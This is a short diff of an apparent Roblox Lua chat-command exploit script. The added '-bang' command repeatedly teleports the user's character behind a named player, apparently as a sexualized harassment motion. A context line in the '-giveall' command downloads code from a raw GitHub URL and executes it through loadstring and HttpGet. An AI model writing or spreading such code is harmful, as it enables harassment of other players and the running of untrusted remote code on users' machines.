@@ -244,6 +244,23 @@ messageDoneFiltering.OnClientEvent:Connect(function(message)
  
  print(msg)
  
+    if msg:lower():sub(1,13) == "-bang" then
+		while true do
+
+   local me = game.Players.LocalPlayer.Character
+ 
+local targetplayer = game.Workspace.TestAccountForBeam3.HumanoidRootPart
+
+me.HumanoidRootPart.CFrame = targetplayer.CFrame * CFrame.new(0, 0, -1.3)
+
+wait(0.1)
+me.HumanoidRootPart.CFrame = targetplayer.CFrame * CFrame.new(0, 0, -2.3)
+
+wait(0.1)
+end
+  end
+ 
+ 
    if msg:lower():sub(1,13) == "-giveall" then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/best", true))()
   end
